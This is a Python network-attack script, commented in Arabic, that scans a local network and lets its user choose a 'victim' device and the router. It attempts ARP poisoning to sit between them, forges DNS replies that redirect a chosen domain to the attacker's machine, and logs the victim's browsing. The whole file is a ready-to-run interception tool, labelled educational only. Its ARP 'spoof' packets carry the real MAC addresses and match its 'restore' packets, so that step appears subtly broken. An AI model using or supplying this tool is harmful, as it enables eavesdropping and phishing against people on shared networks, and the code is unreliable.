#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import threading
import re
from datetime import datetime

# --- 1. التثبيت التلقائي للمكتبات الناقصة ---
try:
    from scapy.all import sniff, IP, UDP, TCP, DNS, DNSRR, DNSQR, send, ARP, Ether, srp, Raw
except ImportError:
    print("[!] مكتبة Scapy غير متوفرة. جاري محاولة التثبيت التلقائي...")
    try:
        # تأكد من أنك تستخدم pip3 إذا كان نظامك يستخدم Python 3
        os.system('pip3 install scapy')
        from scapy.all import sniff, IP, UDP, TCP, DNS, DNSRR, DNSQR, send, ARP, Ether, srp, Raw
        print("[+] تم تثبيت Scapy بنجاح.")
    except Exception as e:
        print(f"[-] فشل التثبيت التلقائي لـ Scapy. يرجى التثبيت يدوياً: pip3 install scapy")
        print(f"الخطأ: {e}")
        sys.exit(1)
# ----------------------------------------


# --- الثوابت والمتغيرات الأولية ---
INTERFACE = "" 
TARGET_DOMAIN = ""
SPOOF_IP = ""

# عناوين IP و MAC الرئيسية
GATEWAY_IP = ""
TARGET_IP = ""
TARGET_MAC = ""
GATEWAY_MAC = ""
RUNNING = True
# -------------------------

# ----------------------------------------------------
# الدوال المساعدة
# ----------------------------------------------------
def validate_domain(domain):
    """التحقق من صحة النطاق المدخل."""
    # نمط للتحقق من أسماء النطاقات الأساسية
    pattern = r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
    return re.match(pattern, domain) is not None

def get_mac(ip):
    """الحصول على عنوان MAC الخاص بـ IP معين."""
    try:
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
        # timeout=2 و retry=2 لزيادة موثوقية الحصول على MAC
        answered, unanswered = srp(arp_request, timeout=2, verbose=0, retry=2, iface=INTERFACE)
        if answered:
            return answered[0][1].hwsrc
        return None
    except Exception:
        return None

def get_network_details(target_ip_range):
    """مسح الشبكة للعثور على الأجهزة المتصلة."""
    print(f"\n[+] جاري مسح نطاق: {target_ip_range}...")
    try:
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip_range)
        answered, unanswered = srp(arp_request, timeout=3, verbose=0, iface=INTERFACE)
        
        devices = []
        print("\n[+] الأجهزة المتصلة المكتشفة:")
        print("=" * 60)
        for sent, received in answered:
            # نتأكد من عدم إضافة الـ IP الخاص بالجهاز المهاجم
            if received.psrc != os.popen(f"ip addr show {INTERFACE} | grep 'inet ' | awk '{{print $2}}' | cut -d/ -f1").read().strip():
                devices.append({'ip': received.psrc, 'mac': received.hwsrc})
                print(f"    - IP: {received.psrc:<15} MAC: {received.hwsrc}")
        print("=" * 60)
        
        return devices
    except Exception as e:
        print(f"[-] خطأ في مسح الشبكة: {e}")
        return []

def get_default_interface():
    """محاولة الحصول على الواجهة الافتراضية باستخدام أوامر النظام."""
    try:
        # محاولة استخدام أمر Linux للحصول على الواجهة الافتراضية
        result = os.popen("ip route | grep default | awk '{print $5}' | head -n1").read().strip()
        return result if result else "eth0"
    except:
        return "eth0"
# ----------------------------------------------------


# ----------------------------------------------------
# 2. وظيفة تسميم ARP (MITM)
# ----------------------------------------------------
def arp_spoof():
    """تسميم ARP مستمر في حلقة متكررة للحفاظ على موقع MITM."""
    global RUNNING, TARGET_MAC, GATEWAY_MAC
    
    while RUNNING:
        try:
            # تسميم الضحية: psrc هو IP الراوتر، hwsrc هو MAC الراوتر الحقيقي
            packet_to_target = ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP, 
                                   hwsrc=GATEWAY_MAC, hwdst=TARGET_MAC)
            send(packet_to_target, verbose=0, iface=INTERFACE)
            
            # تسميم الموجه: psrc هو IP الضحية، hwsrc هو MAC الضحية الحقيقي
            packet_to_gateway = ARP(op=2, psrc=TARGET_IP, pdst=GATEWAY_IP, 
                                    hwsrc=TARGET_MAC, hwdst=GATEWAY_MAC)
            send(packet_to_gateway, verbose=0, iface=INTERFACE)
            
            time.sleep(2)
        except Exception:
            # يخرج بهدوء عند الإيقاف أو الخطأ
            break

# ----------------------------------------------------
# 3. وظيفة استعادة ARP (Cleanup)
# ----------------------------------------------------
def arp_restore():
    """إرسال حزم ARP حقيقية لإعادة الشبكة إلى حالتها الأصلية."""
    global TARGET_IP, TARGET_MAC, GATEWAY_IP, GATEWAY_MAC, INTERFACE
    print("\n[!] إعادة بناء جداول ARP...")
    
    try:
        # إرسال حزمة ARP حقيقية للضحية
        packet_target = ARP(op=2, psrc=GATEWAY_IP, pdst=TARGET_IP, 
                          hwsrc=GATEWAY_MAC, hwdst=TARGET_MAC)
        send(packet_target, count=5, verbose=0, iface=INTERFACE)
        
        # إرسال حزمة ARP حقيقية للموجه
        packet_gateway = ARP(op=2, psrc=TARGET_IP, pdst=GATEWAY_IP, 
                           hwsrc=TARGET_MAC, hwdst=GATEWAY_MAC)
        send(packet_gateway, count=5, verbose=0, iface=INTERFACE)
        
        print("[+] تم الانتهاء من استعادة ARP.")
    except Exception as e:
        print(f"[-] خطأ في استعادة ARP: {e}")

# ----------------------------------------------------
# 4. معالج الحزم الموحد (DNS Spoofing & Sniffing)
# ----------------------------------------------------
def packet_handler(packet):
    """
    الدالة الرئيسية لمعالجة الحزم.
    تقوم بتزوير DNS وعرض تصفح الضحية.
    """
    global TARGET_DOMAIN, SPOOF_IP, TARGET_IP, INTERFACE

    try:
        # --- الجزء الأول: تزوير DNS ---
        if UDP in packet and DNS in packet and packet[IP].src == TARGET_IP:
            if packet[UDP].dport == 53 and packet[DNS].qr == 0:
                
                try:
                    dns_query = packet[DNSQR].qname
                except (AttributeError, IndexError):
                    return

                query_domain = dns_query.decode('utf-8', errors='ignore').rstrip('.')
                target_clean = TARGET_DOMAIN.rstrip('.')
                
                # مقارنة: إذا كان النطاق المستهدف جزءاً من الطلب أو يساويه
                if target_clean in query_domain or query_domain == target_clean:
                    
                    # بناء الرد المزيف (TTL منخفض لضمان التحديث السريع)
                    spoofed_answer = DNSRR(rrname=dns_query, rdata=SPOOF_IP, ttl=60) 

                    # ضبط الأعلام: qr=1 (رد)، aa=1 (مصرح)، rd=1 (الطلب متكرر)، ra=1 (الرد متكرر)
                    dns_response = DNS(
                        id=packet[DNS].id, qr=1, aa=1, rd=1, ra=1,
                        ancount=1, qd=packet[DNS].qd, an=spoofed_answer
                    )
                    ip_response = IP(src=packet[IP].dst, dst=packet[IP].src)
                    udp_response = UDP(sport=53, dport=packet[UDP].sport)
                    
                    spoofed_packet = ip_response / udp_response / dns_response
                    send(spoofed_packet, verbose=0, iface=INTERFACE)
                    
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    print(f"[{timestamp}] [DNS SPOOF] ✅ تم التزوير: {query_domain} -> {SPOOF_IP}")
                    return

        # --- الجزء الثاني: عرض تصفح الضحية (Sniffing) ---
        if TCP in packet and packet[IP].src == TARGET_IP and Raw in packet:
            
            # اعتراض طلبات HTTP (Port 80)
            if packet[TCP].dport == 80:
                try:
                    http_payload = packet[Raw].load.decode('utf-8', errors='replace')
                    if "Host:" in http_payload:
                        host_lines = [line for line in http_payload.split('\n') 
                                    if line.strip().lower().startswith('host:')]
                        if host_lines:
                            # استخراج اسم المضيف بدقة أكبر
                            host = host_lines[0].split(':', 1)[1].strip().split('\r')[0]
                            timestamp = datetime.now().strftime('%H:%M:%S')
                            print(f"[{timestamp}] [HTTP LOG] الضحية يتصفح: http://{host}")
                except Exception:
                    pass
            
            # اعتراض طلبات HTTPS (Port 443)
            elif packet[TCP].dport == 443:
                timestamp = datetime.now().strftime('%H:%M:%S')
                print(f"[{timestamp}] [HTTPS LOG] اتصال آمن بـ: {packet[IP].dst}")
                 
    except Exception:
        # تجاهل الأخطاء البسيطة للحفاظ على تشغيل Sniffer
        pass

# ----------------------------------------------------
# 5. واجهة المستخدم والدالة الرئيسية
# ----------------------------------------------------
def print_banner():
    """طباعة شعار الأداة."""
    banner = """
    ╔═══════════════════════════════════════════╗
    ║         MITM Tool - أداة الاختراق        ║
    ║      DNS Spoofing & Traffic Sniffing     ║
    ║           استخدام تعليمي فقط             ║
    ╚═══════════════════════════════════════════╝
    """
    print(banner)

def main():
    global GATEWAY_IP, TARGET_IP, TARGET_MAC, GATEWAY_MAC, RUNNING
    global TARGET_DOMAIN, SPOOF_IP, INTERFACE
    
    # التحقق من الصلاحيات
    if os.geteuid() != 0:
        print("[!] يجب تشغيل السكربت بصلاحيات الجذر (sudo).")
        sys.exit(1)

    print_banner()
    
    # 🌟 طلب واجهة الشبكة (كما طلبت) 🌟
    default_iface = get_default_interface()
    iface_input = input(f"أدخل اسم الواجهة الشبكية [{default_iface}]: ").strip()
    INTERFACE = iface_input if iface_input else default_iface
    print(f"[+] استخدام الواجهة: {INTERFACE}")

    print("\n--- ⚙️ إعدادات الهجوم ---")
    
    # طلب معلومات التزوير
    while True:
        TARGET_DOMAIN = input("أدخل النطاق المستهدف (مثال: www.facebook.com): ").strip()
        if validate_domain(TARGET_DOMAIN):
            break
        print("[-] النطاق غير صحيح! حاول مرة أخرى.")
    
    if not TARGET_DOMAIN.endswith('.'):
        TARGET_DOMAIN += '.'
    
    SPOOF_IP = input("أدخل عنوان IP المزيف (IP جهازك): ").strip()
    
    # التحقق من صحة IP
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', SPOOF_IP):
        print("[-] عنوان IP غير صحيح!")
        sys.exit(1)
    
    print("\n--- 🧭 تحديد الأهداف ---")
    
    # تفعيل توجيه IP
    try:
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        print("[+] تم تفعيل توجيه IP.")
    except Exception:
        print("[-] فشل تفعيل توجيه IP.")
        sys.exit(1)

    # اختيار الأجهزة
    try:
        network_range = input("أدخل نطاق الشبكة للمسح (مثال: 192.168.1.0/24): ").strip()
        
        devices = get_network_details(network_range)
        
        if len(devices) < 2:
            print("[-] لم يتم العثور على ما يكفي من الأجهزة.")
            sys.exit(1)
        
        print("\n[+] قائمة الأجهزة المتاحة:")
        for i, dev in enumerate(devices):
            print(f"[{i+1}] IP: {dev['ip']:<15} MAC: {dev['mac']}")
        
        router_choice = int(input("\nاختر رقم IP الموجه (الراوتر): "))
        if router_choice < 1 or router_choice > len(devices):
            raise ValueError
            
        GATEWAY_IP = devices[router_choice-1]['ip']
        # إعادة الحصول على MAC لضمان الدقة في اللحظة الأخيرة
        GATEWAY_MAC = get_mac(GATEWAY_IP)

        if not GATEWAY_MAC:
            print("[-] فشل في تحديد MAC الراوتر. تأكد من أن IP الراوتر صحيح.")
            sys.exit(1)

        target_choice = int(input("اختر رقم IP جهاز الضحية: "))
        if target_choice < 1 or target_choice > len(devices):
            raise ValueError
            
        TARGET_IP = devices[target_choice-1]['ip']
        TARGET_MAC = get_mac(TARGET_IP)

        if not TARGET_MAC:
            print("[-] فشل في تحديد MAC الضحية. تأكد من أن الضحية متصل.")
            sys.exit(1)
        
        print(f"\n[✔️] الإعدادات:")
        print(f"    الضحية: {TARGET_IP} ({TARGET_MAC})")
        print(f"    الموجه: {GATEWAY_IP} ({GATEWAY_MAC})")
        print(f"    التزوير: {TARGET_DOMAIN.rstrip('.')} -> {SPOOF_IP}")
        
    except (ValueError, IndexError):
        print("[-] إدخال غير صحيح في اختيار الأهداف.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] تم الإلغاء.")
        sys.exit(0)

    # بدء الهجوم
    input("\n[اضغط Enter للبدء...]")
    
    # بدء تسميم ARP في خلفية مستقلة (Daemon=True يضمن إيقافها مع البرنامج)
    arp_thread = threading.Thread(target=arp_spoof, daemon=True)
    arp_thread.start()
    
    try:
        print(f"\n--- 🎣 بدء اعتراض الحزم وتزوير DNS ---")
        print("--- اضغط Ctrl+C للإيقاف ---")
        print("=" * 70)
        
        # فلتر محسّن: يلتقط كل الحزم التي يكون الضحية طرفاً فيها
        filter_rule = f"ip host {TARGET_IP}"
        sniff(filter=filter_rule, prn=packet_handler, store=0, iface=INTERFACE)
        
    except KeyboardInterrupt:
        print("\n\n[!] تم إيقاف الاعتراض.")
        
    finally:
        # 4. التنظيف وإعادة الضبط (يتم في النهاية مهما حدث)
        RUNNING = False
        time.sleep(2) # انتظار لإنهاء Thread
        
        # التأكد من عدم بقاء Thread شغالة
        if arp_thread.is_alive():
            arp_thread.join(timeout=3)
        
        arp_restore()
        
        try:
            os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
            print("[+] تم إعادة تعيين توجيه IP.")
        except:
            pass
            
        print("[*] تم إغلاق البرنامج بأمان.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] تم إنهاء البرنامج.")
        sys.exit(0)
